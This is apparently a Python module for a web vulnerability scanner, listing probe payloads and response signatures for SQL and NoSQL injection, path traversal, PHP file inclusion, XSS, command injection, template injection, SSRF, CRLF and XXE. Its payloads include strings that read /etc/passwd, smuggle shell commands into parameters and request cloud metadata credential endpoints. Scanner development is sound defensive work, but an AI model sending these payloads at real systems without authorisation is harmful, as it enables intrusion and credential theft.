"""Payloads and detection signatures used by the active checks.

Everything here is intentionally non-destructive: probes either trigger an
error, get reflected, read a world-readable file, or evaluate harmless math.
None of them modify data, escalate access, or run harmful commands.
"""

from __future__ import annotations

import re

SQLI_ERROR_PAYLOADS = ["'", '"', "')", "';", "' OR '1"]

_SQL_DB_SIGNATURES = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"warning: mysqli?_",
        r"mysql_fetch_(array|assoc|row|object)\(\)",
        r"valid mysql result",
        r"mysqlsyntaxerrorexception",
        r"check the manual that corresponds to your (mysql|mariadb)",
        r"supplied argument is not a valid mysql",
    ],
    "PostgreSQL": [
        r"pg_query\(\)|pg_exec\(\)",
        r"psql: error",
        r"postgresql.{0,20}error",
        r"unterminated quoted string",
        r"pg::syntaxerror",
        r"npgsql\.",
    ],
    "Microsoft SQL Server": [
        r"microsoft (ole db|odbc) .{0,30}sql server",
        r"odbc sql server driver",
        r"unclosed quotation mark after the character string",
        r"sqlserverexception",
        r"incorrect syntax near",
        r"\[sql server\]",
    ],
    "Oracle": [
        r"ora-\d{5}",
        r"oracle.{0,20}driver",
        r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"sqlite3?\.(operational|programming)error|sqlite_error",
        r"sqlite/jdbcdriver",
        r"sqlite\.exception",
        r"system\.data\.sqlite",
        r"sqlite3::sqlexception",
    ],
    "Generic": [r"sqlstate\["],
}

_SQL_DB_COMPILED = {
    db: [re.compile(p, re.IGNORECASE) for p in sigs] for db, sigs in _SQL_DB_SIGNATURES.items()
}

SQL_ERROR_SIGNATURES = [rx for sigs in _SQL_DB_COMPILED.values() for rx in sigs]

SQLI_TRUE_PAYLOAD = "' OR '1'='1"
SQLI_FALSE_PAYLOAD = "' AND '1'='2"


def match_sql_error(body: str) -> str:
    if not body:
        return ""
    for sig in SQL_ERROR_SIGNATURES:
        m = sig.search(body)
        if m:
            return m.group(0)
    return ""


def sql_db_fingerprint(body: str) -> str:
    if not body:
        return ""
    for db, sigs in _SQL_DB_COMPILED.items():
        if db == "Generic":
            continue
        if any(s.search(body) for s in sigs):
            return db
    return ""


def sqli_time_payloads(seconds: int) -> list[str]:
    return [
        f"1' AND SLEEP({seconds})-- -",
        f'1" AND SLEEP({seconds})-- -',
        f"1' AND pg_sleep({seconds})-- -",
        f"1'; WAITFOR DELAY '0:0:{seconds}'-- -",
        f"1) AND SLEEP({seconds})-- -",
    ]


def time_based_triggered(baseline_s: float, delayed_s: float, sleep_s: float) -> bool:
    return baseline_s < sleep_s and (delayed_s - baseline_s) >= sleep_s * 0.7


TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..;/..;/..;/..;/etc/passwd",
    "/etc/passwd",
    "../../../../../../../../windows/win.ini",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "C:\\Windows\\win.ini",
]

PASSWD_RE = re.compile(r"root:.*?:0:0:")
WININI_RE = re.compile(r"\[(?:fonts|extensions|mci extensions)\]|for 16-bit app support", re.IGNORECASE)


def match_passwd(body: str) -> str:
    if not body:
        return ""
    m = PASSWD_RE.search(body)
    return m.group(0) if m else ""


def match_traversal(body: str) -> str:
    if not body:
        return ""
    m = PASSWD_RE.search(body)
    if m:
        return m.group(0)
    m = WININI_RE.search(body)
    return m.group(0) if m else ""


LFI_PHP_MARKER = "PD9waHA"

LFI_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../index.php",
]


REDIRECT_PARAM_NAMES = {
    "url", "u", "next", "redirect", "redirect_uri", "redirect_url", "return",
    "returnurl", "return_url", "dest", "destination", "continue", "goto", "to",
    "out", "view", "go", "link", "target",
}


def xss_probe(token: str) -> str:
    return f'wvs{token}"\'><svg/onload=1>'


def xss_reflected_raw(body: str, token: str) -> bool:
    if not body:
        return False
    marker = f"wvs{token}"
    if marker not in body:
        return False
    return f"{marker}\"'><svg/onload=1>" in body or "<svg/onload=1>" in body


def _odd(seg: str, ch: str) -> bool:
    return seg.count(ch) % 2 == 1


def classify_xss_context(body: str, marker: str):
    idx = body.find(marker)
    if idx == -1:
        return None
    before = body[:idx]
    if before.rfind("<script") > before.rfind("</script"):
        seg = before[before.rfind("<script"):]
        if _odd(seg, '"'):
            return "js-string-double"
        if _odd(seg, "'"):
            return "js-string-single"
        return "js"
    if before.rfind("<!--") > before.rfind("-->"):
        return "html-comment"
    if before.rfind("<") > before.rfind(">"):
        seg = before[before.rfind("<"):]
        if _odd(seg, '"'):
            return "attr-double"
        if _odd(seg, "'"):
            return "attr-single"
        return "attr-unquoted"
    return "html-text"


def xss_context_payload(context: str, token: str):
    tail = f"wvs{token}"
    table = {
        "html-text": (f"<svg/onload=alert({token})>{tail}", "<svg/onload="),
        "attr-double": (f'"><svg/onload=alert({token})>{tail}', '"><svg'),
        "attr-single": (f"'><svg/onload=alert({token})>{tail}", "'><svg"),
        "attr-unquoted": (f" onmouseover=alert({token}) {tail}", "onmouseover="),
        "js-string-double": (f'";alert({token});//{tail}', '";alert('),
        "js-string-single": (f"';alert({token});//{tail}", "';alert("),
        "js": (f";alert({token});//{tail}", ";alert("),
        "html-comment": (f"--><svg/onload=alert({token})>{tail}", "--><svg"),
    }
    return table.get(context, (f'"><svg/onload=alert({token})>{tail}', '"><svg'))


def cmdi_payloads(a: int, b: int, left: str, right: str) -> list[str]:
    expr = f"$(({a}*{b}))"
    inner = f"echo {left}{expr}{right}"
    return [
        f"; {inner}",
        f"| {inner}",
        f"& {inner}",
        f"$({inner})",
        f"`{inner}`",
        f"%0a{inner}",
    ]


def cmdi_expected(a: int, b: int, left: str, right: str) -> str:
    return f"{left}{a * b}{right}"


def ssti_payloads(a: int, b: int, left: str, right: str) -> list[str]:
    e = f"{a}*{b}"
    return [
        left + "{{" + e + "}}" + right,
        left + "${" + e + "}" + right,
        left + "#{" + e + "}" + right,
        left + "<%= " + e + " %>" + right,
        left + "{" + e + "}" + right,
        left + "*{" + e + "}" + right,
        left + "${{" + e + "}}" + right,
    ]


def ssti_expected(a: int, b: int, left: str, right: str) -> str:
    return f"{left}{a * b}{right}"


SSTI_FP_PROBE = "{{7*'7'}}"


def ssti_engine(body: str) -> str:
    if not body:
        return ""
    if "7777777" in body:
        return "Jinja2"
    if "49" in body:
        return "Twig"
    return ""


SSRF_PARAM_NAMES = {
    "url", "uri", "u", "link", "src", "source", "target", "dest", "destination",
    "redirect", "redirect_uri", "callback", "webhook", "fetch", "load", "page",
    "path", "file", "host", "site", "domain", "feed", "proxy", "img", "image",
    "open", "data", "reference", "ref", "remote", "endpoint",
}

SSRF_METADATA_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://2852039166/latest/meta-data/",
    "http://0xa9fea9fe/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
]

SSRF_METADATA_SIGNATURES = [
    re.compile(p, re.IGNORECASE)
    for p in [
        r"\bami-id\b",
        r"\binstance-id\b",
        r"\biam/\b",
        r"security-credentials",
        r"accesskeyid",
        r"computemetadata",
        r"\bplacement/\b",
        r"\bvmid\b",
        r"subscriptionid",
        r"service-accounts",
    ]
]

SSRF_CANARY_PAYLOAD = "http://example.com/"
SSRF_CANARY_SIGNATURES = ["Example Domain", "illustrative examples"]


def match_ssrf_metadata(body: str) -> str:
    if not body:
        return ""
    for sig in SSRF_METADATA_SIGNATURES:
        if sig.search(body):
            return sig.pattern
    return ""


def match_ssrf_canary(body: str) -> bool:
    return bool(body) and any(sig in body for sig in SSRF_CANARY_SIGNATURES)


def crlf_payloads(token: str):
    name = f"X-Wvs-{token}"
    value = token
    return [
        (f"%0d%0a{name}:{value}", name, value),
        (f"%0D%0A{name}:{value}", name, value),
        (f"wvs%0d%0a{name}:{value}", name, value),
        (f"\r\n{name}:{value}", name, value),
    ]


NOSQLI_PAYLOADS = [
    "' || '1'=='1",
    '" || "1"=="1',
    "';return true;//",
    "[$ne]=wvs",
    '{"$gt":""}',
]

NOSQL_ERROR_SIGNATURES = [
    re.compile(p, re.IGNORECASE)
    for p in [
        r"mongo(db)?error",
        r"\bbson\b",
        r"\$where",
        r"e11000",
        r"couldn't parse",
        r"cast to objectid failed",
        r"unexpected token .*? in json",
    ]
]


def match_nosql_error(body: str) -> str:
    if not body:
        return ""
    for sig in NOSQL_ERROR_SIGNATURES:
        m = sig.search(body)
        if m:
            return m.group(0)
    return ""


def xxe_payload() -> str:
    return (
        '<?xml version="1.0"?>'
        '<!DOCTYPE wvs [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<wvs>&xxe;</wvs>"
    )


CORS_EVIL_ORIGIN = "https://wvs-evil.example"

HOST_EVIL = "wvs-evil.example"

DANGEROUS_METHODS = {"PUT", "DELETE", "TRACE", "PATCH", "CONNECT"}

GUESSABLE_PARAMS = [
    "id", "page", "file", "path", "url", "q", "search", "query", "name",
    "lang", "view", "action", "cat", "category", "dir", "include", "doc",
    "item", "p", "type", "redirect", "next", "callback", "user", "template",
    "load", "read", "src", "ref", "data",
]
